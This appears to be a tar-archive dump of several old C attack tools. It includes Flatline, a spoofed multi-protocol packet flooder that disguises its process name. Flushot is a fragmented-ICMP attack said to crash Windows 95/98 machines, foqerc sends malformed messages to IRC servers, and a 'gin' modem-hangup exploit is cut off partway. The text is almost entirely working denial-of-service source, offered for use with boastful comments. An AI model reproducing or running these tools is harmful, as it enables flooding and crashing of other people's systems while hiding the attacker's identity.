            "#include <netdb.h>                // Used for Hosts Lookup.",
            "#include <stdio.h>                // Standard I/O Library.",
            "#include <sys/types.h>            // Primitive System Data Types.",
            "#include <sys/socket.h>           // RAW Socket Library.",
            "#include <netinet/in.h>           // ??",
            "#include <netinet/in_systm.h>     // ??",
            "#include <netinet/ip.h>           // Internet Protocol Library.",
            "#include <arpa/inet.h>            // Internet stuff.",
            "#include <signal.h>               // Signal Handling Library.",
            "#ifndef __USE_BSD",
            "#define __USE_BSD",
            "#endif",
            "#define __FAVOR_BSD",
            "#include <netinet/udp.h>       // UDP Structure Library.",
            "#include <netinet/tcp.h>       // TCP Structure Library.",
            "#include <netinet/ip_icmp.h>      // ICMP Structure Library.",
            "#include <netinet/igmp.h>         // IGMP Structure Library.",
            "#include <pwd.h>                  // ******** File.",
            "#include <time.h>                 // Time & Date Manipulation Library.",
            "/****************************   DEFINES  ******************************/",
            "#define Port_Max 65534             // Highest Addressable Port.",
            "#define Packet_Max 1023            // Largest Packet Size.",
            "#define Default_Fork 0             // Don't fork by default.",
            "#define Default_Stealth \"(nfsiod)\" // Make me look like the nfsiod program.",
            "#ifndef TRUE",
            "#define TRUE    1",
            "#define FALSE   0",
            "#endif",
            "/* Color Pallete ('Cause pretty makes it better) */",
            "#define B  \"\\033[1;30m\"           // Blue.",
            "#define R  \"\\033[1;31m\"           // Red.",
            "#define G  \"\\033[1;32m\"           // Green.",
            "#define Y  \"\\033[1;33m\"           // Yellow.",
            "#define U  \"\\033[1;34m\"           // Uh, I don't know.",
            "#define M  \"\\033[1;35m\"           // Magenta.",
            "#define C  \"\\033[1;36m\"           // Cyan.",
            "#define W  \"\\033[1;37m\"           // White.",
            "#define DR \"\\033[0;31m\"           // Dark Red.",
            "#define DG \"\\033[0;32m\"           // Dark Green.",
            "#define DY \"\\033[0;33m\"           // Dark Yellow (Otherwise known as Brown).",
            "#define DU \"\\033[0;34m\"           // Dark Uh, I don't know.",
            "#define DM \"\\033[0;35m\"           // Dark Magenta.",
            "#define DC \"\\033[0;36m\"           // Dark Cyan.",
            "#define DW \"\\033[0;37m\"           // Dark White (Otherwise known as Gray).",
            "#define RESTORE \"\\33[0;0m\"        // RESTORE crap!",
            "#define CLEAR \"\\033[0;0H\\033[J\"   // Clear the terminal view.",
            "/*********************  VARIABLE DECLARATIONS  *******************/",
            "// The destination address...",
            "struct sockaddr_in dstaddr;",
            "// The packet destination (htonl)",
            "unsigned long dst;",
            "// Packet Definitions and Structures",
            "// ICMP PACKET...",
            "char   *ICMP_Packet;",
            "struct ip      *ICMP_IP_HDR;",
            "struct icmphdr *ICMP_HDR;",
            "int    ICMP_Size;",
            "// IGMP PACKET...",
            "char   *IGMP_Packet;",
            "struct ip      *IGMP_IP_HDR;",
            "struct igmphdr *IGMP_HDR;",
            "int    IGMP_Size;",
            "// UNREACH PACKET...",
            "char   *UNREACH_Packet;",
            "struct ip      *UNREACH_IP_HDR;",
            "struct icmphdr *UNREACH_ICMP_HDR;",
            "int    UNREACH_Size;",
            "// UDP PACKET...",
            "char           *UDP_Packet;",
            "struct ip      *UDP_IP_HDR;",
            "struct udphdr  *UDP_HDR;",
            "int            UDP_Size;",
            "// SYN PACKET...",
            "char          *SYN_Packet;",
            "struct ip     *SYN_IP_HDR;",
            "struct tcphdr *SYN_TCP_HDR;",
            "int           SYN_Size;",
            "// Miscellaneous Variables...",
            "char *target;",
            "char *stealth;",
            "int  opensock;              // Socket to send through.",
            "int  unlim         =  0;    // Default unlimited is OFF.",
            "int  dstport       =  0;    // Destination Port.",
            "int  srcport       =  0;    // Source Port.",
            "int  numpacks      =  0;    // Number of Packets to be delivered.",
            "int  burst         =  0;    // I think this is a usleep value (Why go slower?)",
            "int  forknum       =  0;    // Number of times to fork off...",
            "int  eminsize      =  9;    // Minimum size of the letter 'e'.",
            "int  uminsize      = 56;    // Minimum size of the letter 'u'.",
            "int  burstmode     = FALSE; // Something that Soulblazer dreamed up.",
            "int  etype[10]     = {0, 4, 8, 12, 13, 14, 15, 16, 17, 18};",
            "int  ucode[16]     = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};",
            "/**************************  FUNCTION PROTOTYPES  ***************************/",
            "void banner (void);",
            "// This function displays program information for those without the",
            "// source for Flatline. LOSERS need not apply...",
            "// This function calls no functions.",
            "// This function is called by MAIN.",
            "void usage (char *pname);",
            "// This function displays program usage if the user has entered",
            "// insufficient or invalid command-line options.",
            "// This function calls no functions.",
            "// This function is called by Parse_Args and MAIN.",
            "void resolvedest (void);",
            "// This function resolves the Host name for the target system.",
            "// This function calls no functions.",
            "// This function is called by MAIN.",
            "void parse_args (int argc, char *argv[]);",
            "// This functions handles command-line parsing.",
            "// This function calls Usage.",
            "// This function is called by MAIN.",
            "void cloaking (int argc, char *argv[]);",
            "// This function allows Flatline to cloak itself by using the name of",
            "// a program that runs on most computers. ",
            "// This function calls no functions.",
            "// This function is called by MAIN.",
            "/**************************  FUNCTION DEFINITIONS  **************************/",
            "void banner () {",
            "  printf (\"%s%sWe Kick Ass...\", CLEAR, Y);",
            "} /* End Banner */",
            "void usage (char *pname) { ",
            "  printf (\"%s%sUSAGE : %s%s > You messed it up!\\n\", CLEAR, M, B, pname);",
            "  exit(EXIT_SUCCESS); ",
            "} /* End Usage */",
            "void resolvedest(void) {",
            "  struct hostent *host;",
            "  memset(&dstaddr, 0, sizeof(struct sockaddr_in));",
            "  dstaddr.sin_family = AF_INET;",
            "  dstaddr.sin_addr.s_addr = inet_addr(target);",
            "  if (dstaddr.sin_addr.s_addr == -1) {",
            "          host = gethostbyname(target);",
            "          if (host == NULL) {",
            "            printf(\"[*] Unable To resolve %s\\t\\n\", target);",
            "      exit(EXIT_FAILURE);",
            "          } /* End If */",
            "          dstaddr.sin_family = host->h_addrtype;",
            "          memcpy((caddr_t) & dstaddr.sin_addr, host->h_addr, host->h_length);",
            "  } /* End If */",
            "  memcpy(&dst, (char *) &dstaddr.sin_addr.s_addr, 4);",
            "} /* End ResolveDest */",
            "void parse_args(int argc, char *argv[]) {",
            "  int opt;",
            "  while ((opt = getopt(argc, argv, \"x:n:f:\")) != -1)",
            "    switch (opt) {",
            "      case 'x':",
            "        stealth = (char *) malloc(strlen(optarg));",
            "        strcpy(stealth, optarg);",
            "        break;",
            "      case 'n':",
            "        numpacks = atoi(optarg);",
            "        break;",
            "      case 'f':",
            "        forknum = atoi(optarg);",
            "        break;",
            "      default:",
            "        usage(argv[0]);",
            "    } /* End Switch */",
            "    // What do we look like?",
            "    if (!stealth)",
            "       stealth = Default_Stealth;",
            "    // How many times do you want me to fork?",
            "    if (!forknum)",
            "       forknum = Default_Fork;",
            "    // Do we have a Packet Destination?",
            "    // NO.",
            "    if (!argv[optind]) {",
            "            printf(\"\\n\\n%s[%s*%s]%s We need a Place for the Packets to Go%s\\n\",DC,W,DC,DR,RESTORE);",
            "            exit(EXIT_FAILURE);",
            "    }/* End If */",
            "    // YES.",
            "    target = (char *) malloc(strlen(argv[optind]));",
            "   // Did we have memory to copy the target address? (I sure as hell hope so!)",
            "    if (!target) {",
            "            printf(\"\\n\\n%s[%s*%s]%s Unable to Allocate Required Amount of Memory for Task%s\\n\",DC,W,DC,DR,RESTORE);",
            "      perror(\"malloc\");",
            "            exit(EXIT_FAILURE);",
            "    } /* End If */",
            "    // Copy the target address...",
            "    strcpy(target, argv[optind]);",
            "} /* End Parse_Args */",
            "void cloaking(int argc, char *argv[]) {",
            "  register Index;",
            "  // Replace arguments with zeros...",
            "  for (Index = argc-1; Index >= 0; Index--)",
            "    memset(argv[Index], 0, strlen(argv[Index]));",
            "  // Replace the process name with a common name...",
            "  strcpy(argv[0], stealth);",
            "} /* End Cloaking */",
            "int Setup_Packets (void) {",
            "  // Create & Set the ICMP Packet...",
            "  ICMP_Size        = sizeof (struct ip) + sizeof(struct icmphdr);",
            "  ICMP_Packet      = (char *) malloc(ICMP_Size);",
            "  ICMP_IP_HDR      = (struct ip *) ICMP_Packet;",
            "  ICMP_HDR         = (struct icmphdr *) (ICMP_Packet + sizeof(struct ip));",
            "  memset (ICMP_Packet, 0, ICMP_Size);",
            "  // Create & Set the UDP Packet...",
            "  UDP_Size         = sizeof(struct ip) + sizeof(struct udphdr);",
            "  UDP_Packet       = (char *) malloc(UDP_Size);",
            "  UDP_IP_HDR       = (struct ip *) UDP_Packet;",
            "  UDP_HDR          = (struct udphdr *) (UDP_Packet + sizeof(struct ip));",
            "  memset (UDP_Packet, 0, UDP_Size);",
            "  // Create & Set the IGMP Packet...",
            "  IGMP_Size        = sizeof(struct ip) + sizeof(struct igmphdr);",
            "  IGMP_Packet      = (char *) malloc(IGMP_Size);",
            "  IGMP_IP_HDR      = (struct ip *) IGMP_Packet;",
            "  IGMP_HDR         = (struct igmphdr *) (IGMP_Packet + sizeof(struct ip));",
            "  memset (IGMP_Packet, 0, IGMP_Size);",
            "  // Create & Set the UNREACH Packet...",
            "  UNREACH_Size     = sizeof(struct ip) + sizeof(struct icmphdr);",
            "  UNREACH_Packet   = (char *) malloc(UNREACH_Size);",
            "  UNREACH_IP_HDR   = (struct ip *) UNREACH_Packet;",
            "  UNREACH_ICMP_HDR = (struct icmphdr *) (UNREACH_Packet + sizeof(struct ip));",
            "  memset (UNREACH_Packet, 0, UNREACH_Size);",
            "  // Create & Set the SYN Packet...",
            "  SYN_Size    = sizeof(struct ip) + sizeof(struct tcphdr);",
            "  SYN_Packet  = (char *) malloc(SYN_Size);",
            "  SYN_IP_HDR  = (struct ip *) SYN_Packet;",
            "  SYN_TCP_HDR = (struct tcphdr *) (SYN_Packet + sizeof(struct ip));",
            "  memset (SYN_Packet, 0, SYN_Size);",
            "  // Stick in some static values for =>",
            "  // ICMP :",
            "  ICMP_IP_HDR->ip_dst.s_addr    = dst;              // Destination IP Address.",
            "  ICMP_IP_HDR->ip_v             = 4;                // IP Version Number.",
            "  ICMP_IP_HDR->ip_off           = htons(0x2000);    // Ask Soulblazer.",
            "  ICMP_IP_HDR->ip_hl            = 5;                // Ditto.",
            "  ICMP_IP_HDR->ip_ttl           = 255;              // Time to Live.",
            "  ICMP_IP_HDR->ip_p             = IPPROTO_ICMP;     // IP Protocol.",
            "  ICMP_IP_HDR->ip_tos           = htons(0xe0);      // Type of Service. (I wonder what service 0x45 is.)",
            "  ICMP_IP_HDR->ip_len           = htons(ICMP_Size); // Length of the IP header.",
            "  ICMP_IP_HDR->ip_sum           = 0;                // Force Kernel Checksum?",
            "  ICMP_HDR->code                = 0;                // Ask Soulblazer.",
            "  ICMP_HDR->checksum            = htons(ICMP_Size + eminsize);",
            "  // SYN :",
            "  SYN_IP_HDR->ip_dst.s_addr     = dst;              // Destination IP Address.",
            "  SYN_IP_HDR->ip_v              = 4;                // IP Version Number.",
            "  SYN_IP_HDR->ip_off            = htons(0x2000);    // Ask Soulblazer.",
            "  SYN_IP_HDR->ip_hl             = 5;                // Ditto.",
            "  SYN_IP_HDR->ip_ttl            = 255;              // Time to Live.",
            "  SYN_IP_HDR->ip_p              = IPPROTO_TCP;      // IP Protocol.",
            "  SYN_IP_HDR->ip_tos            = htons(0xe0);      // Type of Service. (I wonder what service 0x45 is.)",
            "  SYN_IP_HDR->ip_len            = htons(SYN_Size);  // Length of the IP header.",
            "  SYN_IP_HDR->ip_sum            = 0;                // Force Kernel Checksum?",
            "  SYN_TCP_HDR->th_flags         = TH_SYN;",
            "  SYN_TCP_HDR->th_win           = htons(65535);",
            "  SYN_TCP_HDR->th_sum           = htons(SYN_Size);",
            "  // IGMP :",
            "  IGMP_IP_HDR->ip_dst.s_addr    = dst;              // Destination IP Address.",
            "  IGMP_IP_HDR->ip_v             = 4;                // IP Version Number.",
            "  IGMP_IP_HDR->ip_off           = htons(0x2000);    // Ask Soulblazer.",
            "  IGMP_IP_HDR->ip_hl            = 5;                // Ditto.",
            "  IGMP_IP_HDR->ip_ttl           = 255;              // Time to Live.",
            "  IGMP_IP_HDR->ip_p             = IPPROTO_IGMP;     // IP Protocol.",
            "  IGMP_IP_HDR->ip_tos           = htons(0xe0);      // Type of Service. (I wonder what service 0x45 is.)",
            "  IGMP_IP_HDR->ip_len           = htons(IGMP_Size); // Length of the IP header.",
            "  IGMP_IP_HDR->ip_sum           = 0;                // Force Kernel Checksum?",
            "  IGMP_HDR->type                = 17;",
            "  IGMP_HDR->code                = 0;",
            "  IGMP_HDR->csum                = htons(IGMP_Size);",
            "  // UNREACH :",
            "  UNREACH_IP_HDR->ip_dst.s_addr = dst;                 // Destination IP Address.",
            "  UNREACH_IP_HDR->ip_v          = 4;                   // IP Version Number.",
            "  UNREACH_IP_HDR->ip_off        = htons(0x2000);       // Ask Soulblazer.",
            "  UNREACH_IP_HDR->ip_hl         = 5;                   // Ditto.",
            "  UNREACH_IP_HDR->ip_ttl        = 255;                 // Time to Live.",
            "  UNREACH_IP_HDR->ip_p          = IPPROTO_ICMP;        // IP Protocol.",
            "  UNREACH_IP_HDR->ip_tos        = htons(0xe0);         // Type of Service. (I wonder what service 0x45 is.)",
            "  UNREACH_IP_HDR->ip_len        = htons(UNREACH_Size); // Length of the IP header.",
            "  UNREACH_IP_HDR->ip_sum        = 0;                   // Force Kernel Checksum?",
            "  UNREACH_ICMP_HDR->type        = 3;",
            "  UNREACH_ICMP_HDR->checksum    = htons(UNREACH_Size + uminsize);",
            "  // UDP :",
            "  UDP_IP_HDR->ip_dst.s_addr     = dst;                 // Destination IP Address.",
            "  UDP_IP_HDR->ip_v              = 4;                   // IP Version Number.",
            "  UDP_IP_HDR->ip_off            = htons(0x2000);       // Ask Soulblazer.",
            "  UDP_IP_HDR->ip_hl             = 5;                   // Ditto.",
            "  UDP_IP_HDR->ip_ttl            = 255;                 // Time to Live.",
            "  UDP_IP_HDR->ip_p              = IPPROTO_UDP;         // IP Protocol.",
            "  UDP_IP_HDR->ip_tos            = htons(0xe0);         // Type of Service. (I wonder what service 0x45 is.)",
            "  UDP_IP_HDR->ip_len            = htons(UDP_Size);     // Length of the IP header.",
            "  UDP_IP_HDR->ip_sum            = 0;                   // Force Kernel Checksum?",
            "  UDP_HDR->uh_ulen               = htons(sizeof(struct udphdr));",
            "return(0);",
            "} /* End Setup_Packets */",
            "/**************************  FLATLINE < MAIN >  **************************/",
            "void main(int argc, char *argv[]) {",
            "  register ForkCount; // Used as FOR control of # times forked.",
            "  register PackCount; // Used as FOR control of # packets sent.",
            "  register unlim = 0; // Required for Unlimited packet count.",
            "  if ((opensock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {",
            "    perror(\"socket\");",
            "    exit(1);",
            "  } /* End If */",
            "  setgid(getgid());",
            "  setuid(getuid());",
            "  if (argc < 2)",
            "    usage(argv[0]);",
            "  parse_args(argc, argv);",
            "  cloaking(argc, argv);",
            "    ",
            "  resolvedest();",
            "  // Do we want to fork? I know I sure as hell don't!",
            "  if (forknum) {",
            "    // See if we can we fork?",
            "    switch(fork()) {",
            "      // Failure to comply...",
            "      case -1:",
            "        printf(\"%s  [%s*%s]%s Your OS cant Make the fork() call as we need it%s\",DC,W,DC,DR,RESTORE);",
            "        printf(\"%s  [%s*%s]%s This is usually an indication of something bad%s\",DC,W,DC,DR,RESTORE);",
            "        exit(1);",
            "      // Um, I'm not sure what happened so let's skip any more fork stuff...",
            "      case 0:",
            "        break;",
            "      // Why have one when you can have one when you can have two for twice ",
            "      // the price?",
            "      default:",
            "        forknum--;",
            "        // Fork Off...",
            "       for(ForkCount = 0; ForkCount < forknum; ForkCount++){",
            "         switch(fork()){",
            "           case -1:",
            "             printf(\"%s  [%s*%s]%s Unable to fork%s\\n\",DC,W,DC,DR,RESTORE);",
            "             printf(\"%s  [%s*%s]%s This is usually an indication of something bad%s\",DC,W,DC,DR,RESTORE);",
            "              exit(1);",
            "           case 0:",
            "             ForkCount = forknum;",
            "             break;",
            "           default:",
            "             if(ForkCount == forknum-1){",
            "               printf(\"%s  [%s*%s]%s  Process Backgrounded%s\\n\",DC,W,DC,DR,RESTORE);",
            "               exit(0);",
            "             } /* End If */",
            "         } /* End Switch */",
            "       } /* End For */",
            "     } /* End Switch */",
            "   } /* End If */",
            "  // Do you want me to run forever?",
            "  if (!numpacks) {",
            "   unlim++;",
            "   numpacks++;",
            "  } /* End If */",
            "  // Set up the parts of the packets that do not change...",
            "  Setup_Packets();",
            "  // Say Hello...",
            "  banner();",
            "  // NOTES on the FOR statement implementation :",
            "  // If Unlimited is TRUE, decrement the packet count then increment it (0 Change PackCount < numpacks).",
            "  // If Unlimited id FALSE, increment the packet count then increment it again.",
            "  // I didn't write this part but doesn't it send half of the number of packets if you specify a",
            "  // numpacks value?  The last increment should be removed, so that if !unlim then PackCount would",
            "  // decrement continually.",
            "  // Oh well, so much for philosophy let's reach out and drown some unsuspecting surfers...",
            "  for (PackCount = 0; PackCount < numpacks; (unlim) ? PackCount++, PackCount-- : PackCount++) {",
            "    // Volatile Values for ICMP Packet...",
            "    ICMP_IP_HDR->ip_src.s_addr = htonl(rand());",
            "    ICMP_IP_HDR->ip_id         = rand();",
            "    ICMP_HDR->type             = etype[rand()%10];",
            "    // Take that...",
            "    sendto(opensock, ICMP_Packet, ICMP_Size + eminsize, 0, (struct sockaddr *) &dstaddr, sizeof(struct sockaddr_in));",
            "    // Volatile Values for IGMP Packet...",
            "    IGMP_IP_HDR->ip_src.s_addr = htonl(rand());",
            "    IGMP_IP_HDR->ip_id         = rand();",
            "    IGMP_HDR->group            = htonl(rand());",
            "    IGMP_HDR->csum             = htons(sizeof(struct ip) + sizeof(struct igmphdr));",
            "    // And this...",
            "    sendto(opensock, IGMP_Packet, IGMP_Size, 0, (struct sockaddr *) &dstaddr, sizeof(struct sockaddr_in));",
            "    // Volatile Values for SYN Packet...",
            "    SYN_IP_HDR->ip_src.s_addr = htonl(rand());",
            "    SYN_IP_HDR->ip_id         = rand();",
            "    SYN_TCP_HDR->th_seq       = rand();",
            "    SYN_TCP_HDR->th_ack       = rand();",
            "    SYN_TCP_HDR->th_dport     = htons(rand()% Port_Max + 1);",
            "    SYN_TCP_HDR->th_sport     = htons(rand()% Port_Max + 1);",
            "    // and one of these...",
            "    sendto(opensock, SYN_Packet, SYN_Size, 0, (struct sockaddr *) &dstaddr, sizeof(struct sockaddr_in));",
            "    // Volatile Values for UNREACH Packet...",
            "    UNREACH_IP_HDR->ip_src.s_addr = htonl(rand());",
            "    UNREACH_IP_HDR->ip_id         = rand();",
            "    ICMP_HDR->code                = ucode[rand()%16];",
            "    // and some of this...",
            "    sendto(opensock, UNREACH_Packet, UNREACH_Size + uminsize, 0, (struct sockaddr *) &dstaddr, sizeof(struct sockaddr_in));",
            "    // Volatile Values for UDP Packet...",
            "    UDP_IP_HDR->ip_src.s_addr = htonl(rand());",
            "    UDP_IP_HDR->ip_id         = rand();",
            "    UDP_HDR->uh_sport           = htons(rand()% Port_Max + 1);",
            "    UDP_HDR->uh_dport           = htons(rand()% Port_Max + 1);",
            "    // Do not mess in the affairs of wizards, for you are crunchy and good with ketchup...",
            "    sendto(opensock, UDP_Packet, UDP_Size, 0, (struct sockaddr *) &dstaddr, sizeof(struct sockaddr_in));",
            "  } /* End For */",
            "} /* End MAIN */",
            "/* EOF < FLATLINE > */",
            "datapool/src/flushot.c",
            "0100644",
            "0000000",
            "0000000",
            "00000010615",
            "07100655272",
            "014006",
            "ustar  ",
            "root",
            "root",
            "/* Lags CPU Made By DarkShadow from The flu Hacking Group",
            "   Kills Win95-98 machines",
            "   http://www.angelfire.com/ar/WarzonE/flu.html",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "void banner(void) {",
            "        ",
            "   printf(\"Remote Flushot v 1.0\\n\\n\");",
            "   printf(\"\\n\\n\");",
            "void usage(const char *progname) {",
            "   printf(\" usage:\\n\");",
            "   printf(\"./flushot [Spoofed IP] [Destination IP] [# of FLushot to Send]\\n\",progname);",
            "   printf(\" [Spoofed IP] :  ex: 205.56.78.0\\n\");",
            "   printf(\" [Destination IP] :  ex: 201.12.3.76\\n\");",
            "   printf(\" [# of FLushot to Send]  : 100\\n\");",
            "   printf(\"The Flu Hacking Group (c)\\n\");",
            "   printf(\"DarkShadow PlimoMan Hack The Planet\\n\");",
            "int resolve( const char *name, unsigned int port, struct sockaddr_in *addr ) {",
            "   struct hostent *host;",
            "   memset(addr,0,sizeof(struct sockaddr_in));",
            "   addr->sin_family = AF_INET;",
            "   addr->sin_addr.s_addr = inet_addr(name);",
            "   if (addr->sin_addr.s_addr == -1) {",
            "      if (( host = gethostbyname(name) ) == NULL )  {",
            "         fprintf(stderr,\"ERROR: Unable to resolve host %s\\n\",name);",
            "         return(-1);",
            "      }",
            "      addr->sin_family = host->h_addrtype;",
            "      memcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);",
            "   }",
            "   addr->sin_port = htons(port);",
            "   return(0);",
            "unsigned short in_cksum(addr, len)",
            "    u_short *addr;",
            "    int len;",
            "    register int nleft = len;",
            "    register u_short *w = addr;",
            "    register int sum = 0;",
            "    u_short answer = 0;",
            "    while (nleft > 1)  {",
            "        sum += *w++;",
            "        nleft -= 2;",
            "    }",
            "    if (nleft == 1) {",
            "        *(u_char *)(&answer) = *(u_char *)w ;",
            "        sum += answer;",
            "    }",
            "    sum = (sum >> 16) + (sum & 0xffff);",
            "    sum += (sum >> 16);                 ",
            "    answer = ~sum;                      ",
            "    return(answer);",
            "int send_winbomb(int socket,",
            "                 unsigned long spoof_addr,",
            "                 struct sockaddr_in *dest_addr) {",
            "   unsigned char  *packet;",
            "   struct iphdr   *ip;",
            "   struct icmphdr *icmp;",
            "   int rc;",
            "   packet = (unsigned char *)malloc(sizeof(struct iphdr) +",
            "                                    sizeof(struct icmphdr) + 8);",
            "   ip = (struct iphdr *)packet;",
            "   icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));",
            "   memset(ip,0,sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);",
            "   ip->ihl      = 5;",
            "   ip->version  = 4;",
            "// ip->tos      = 2;",
            "   ip->id       = htons(1234);",
            "   ip->frag_off |= htons(0x2000);",
            "// ip->tot_len  = 0;",
            "   ip->ttl      = 30;",
            "   ip->protocol = IPPROTO_ICMP;",
            "   ip->saddr    = spoof_addr;",
            "   ip->daddr    = dest_addr->sin_addr.s_addr;",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   icmp->type              = 12;",
            "   icmp->code              = 0;",
            "   icmp->checksum          = in_cksum(icmp,sizeof(struct icmphdr) + 1);",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct icmphdr) + 1,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "   ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);",
            "   ip->frag_off = htons(8 >> 3);",
            "   ip->frag_off |= htons(0x2000);",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   icmp->type = 0;",
            "   icmp->code = 0;",
            "   icmp->checksum = 0;",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct icmphdr) + 8,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "   free(packet);",
            "   return(0);",
            "int main(int argc, char * *argv) {",
            "   struct sockaddr_in dest_addr;",
            "   unsigned int i,sock;",
            "   unsigned long src_addr;",
            "   banner();",
            "   if ((argc != 4)) {",
            "      usage(argv[0]);",
            "      return(-1);",
            "   }",
            "   if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {",
            "      fprintf(stderr,\"ERROR: Opening raw socket.\\n\");",
            "      return(-1);",
            "   }",
            "   if (resolve(argv[1],0,&dest_addr) == -1) { return(-1); }",
            "   src_addr = dest_addr.sin_addr.s_addr;",
            "   if (resolve(argv[2],0,&dest_addr) == -1) { return(-1); }",
            "   printf(\"Status: Connected....packets sent.\\n\",argv[0]);",
            "   for (i = 0;i < atoi(argv[3]);i++) {",
            "      if (send_winbomb(sock,",
            "                       src_addr,",
            "                       &dest_addr) == -1) {",
            "         fprintf(stderr,\"ERROR: Unable to Connect To luser.\\n\");",
            "         return(-1);",
            "      }",
            "      ",
            "   }",
            "datapool/src/foqerc.c",
            "0100644",
            "0000000",
            "0000000",
            "00000004306",
            "07051164074",
            "013601",
            "ustar  ",
            "root",
            "root",
            "/* Here's some gay source code that sends pheared messages",
            "   to CR <1.5 servers --REwT */",
            "#include <stdio.h>",
            "#include <sys/types.h>",
            "#include <netdb.h>",
            "#include <arpa/inet.h>",
            "#include <netinet/in.h>",
            "#include <sys/socket.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/tcp.h>",
            "/*#include <netinet/protocols.h>*/",
            "#include <string.h>",
            "#define dport 6667",
            "int x, s;",
            "char str[800];",
            "struct sockaddr_in addr;",
            "struct hostent *host;",
            "int open_sock(int sock, char *server, int port)",
            "\t struct sockaddr_in blah;",
            "\t struct hostent *he;",
            "\t bzero((char *)&blah,sizeof(blah));",
            "\t blah.sin_family=AF_INET;",
            "\t blah.sin_addr.s_addr=inet_addr(server);",
            "\t blah.sin_port=htons(port);",
            "    if ((he = gethostbyname(server)) != NULL) {",
            "\t\t  bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);",
            "    }",
            "    else {",
            "\t   if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {",
            "           perror(\"gethostbyname()\");",
            "           return(-3);",
            "\t\t\t}",
            "    }",
            "        if (connect(sock,(struct sockaddr *)&blah,16)==-1) {",
            "\t\t\t\t perror(\"connect()\");",
            "             close(sock);",
            "\t\t\t\t return(-4);",
            "        }",
            "\t\t  printf(\"Connected to [%s:%d].\\n\",server,port);",
            "\t\t  return;",
            "void main(int argc, char *argv[]) {",
            "     if (argc != 3) {",
            "       printf(\"Usage: %s <target> <message>\\n\",argv[0]);",
            "\t\t exit(0);",
            "     }",
            "     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {",
            "        perror(\"socket()\");",
            "        exit(-1);",
            "     }",
            "     open_sock(s, argv[1], dport);",
            "     printf(\"Sending annoyance... \");",
            "       strcpy(str, \"PASS :x\\n\");",
            "       send(s, str, strlen(str), 0);",
            "       strcpy(str, \"SERVER ----------------------------------!\"); ",
            "       send(s, str, strlen(str), 0);",
            "       strcpy(str, argv[2]);",
            "       send(s, str, strlen(str), 0);",
            "       strcpy(str, \"!---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 1 :bah\\n\");",
            "       send(s, str, strlen(str), 0);",
            "     printf(\"Done!\\n\");",
            "     close(s);",
            "datapool/src/galt_gin.c",
            "0100644",
            "0000000",
            "0000000",
            "00000013167",
            "07065414274",
            "014120",
            "ustar  ",
            "root",
            "root",
            " * galt_gin.c by galt (galt@cowofdoom.com)",
            " * amputee had some very interesting ideas of things to do in his gin.c",
            " * exploit.  I decided to write something to do those things.",
            " * this does the gin exploit thingy to one host or a subnet",
            " * it allows you to specify a command for the modem on the command line",
            " * stuff ",
            " * hehe ",
            " * code/ideas from gin.c, ping.c, and papasmurf-linux.c",
            " * http://galt.cowofdoom.com/",
            " * greets or whatever to: DrHamstuh, CowOfDoom, ralf, viralcode,",
            " *\tTripWire, undernet #hackphreak for being really boring hehe,",
            " *\tand undernet #teenchat for being a good place to waste",
            " *\ttime sometimes or something hehe",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <errno.h>",
            "#include <netdb.h>",
            "#include <sys/types.h> ",
            "#include <sys/socket.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "#define DEFDATASIZE 9 // \"+++ATH0\\r\" and the null",
            "#define DEFDELAY 10",
            "#define BUFSIZE 80",
            "char target[BUFSIZE],source[BUFSIZE],thestring[BUFSIZE];",
            "int subnetmode=0;",
            "int datasize=DEFDATASIZE;",
            "int mcommand=0;",
            "int delay=DEFDELAY;",
            "unsigned long doresolve(char *stuff);",
            "static int in_cksum(u_short *addr, int len);",
            "void docmdline(int argc,char **argv);",
            "int main(int argc,char **argv) {",
            "\tint tmp;",
            "\tunsigned long src,dst;",
            "\tint sockfd,pktsize;",
            "\tchar *packet;",
            "\tstruct sockaddr_in sin;",
            "\tstruct iphdr *ip;",
            "\tstruct icmphdr *icmp;",
            "\tchar *data;",
            "\tdocmdline(argc,argv);",
            "\tsrand(time(NULL)*getpid());",
            "\tif(*source)",
            "\t\tsrc = doresolve(source);",
            "\telse",
            "\t\tsrc = rand();",
            "\tdst = doresolve(target);",
            "\tif( (sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0) {",
            "\t\tfprintf(stderr,\"couldnt open raw socket\\n\");",
            "\t\texit(1);",
            "\tsin.sin_port = htons(0);",
            "\tsin.sin_family = AF_INET;",
            "\tsin.sin_addr.s_addr = src;",
            "\tpktsize = sizeof(struct iphdr)+sizeof(struct icmphdr)+datasize;",
            "\tif( (packet = (char *)malloc(pktsize))==(char *)NULL) {",
            "\t\tfprintf(stderr,\"couldnt malloc packet\\n\");",
            "\t\texit(1);",
            "\tip = (struct iphdr *)packet;",
            "\ticmp = (struct icmphdr *)(packet + sizeof(struct iphdr));",
            "\tdata = (char *)(packet + sizeof(struct iphdr)+sizeof(struct icmphdr));",
